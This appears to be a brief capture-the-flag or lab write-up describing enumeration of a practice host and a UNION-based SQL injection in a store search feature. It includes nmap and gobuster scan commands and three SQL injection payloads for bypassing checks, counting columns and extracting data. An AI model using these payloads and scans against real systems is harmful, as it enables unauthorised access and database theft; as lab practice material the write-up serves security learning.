Project Description

I performed network and web enumeration of the target host, which led to the discovery of active services and additional subdomains. I identified a SQL Injection vulnerability in the store search functionality, determined the number of columns in the backend query, and extracted database information using a UNION-based SQL injection.

nmap -p- --min-rate 5000 10.65.142.1
gobuster dir -u http://store.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt -x php -t 40

' OR 1=1-- -
' ORDER BY 4-- -
' UNION SELECT 1,2,3,4-- -
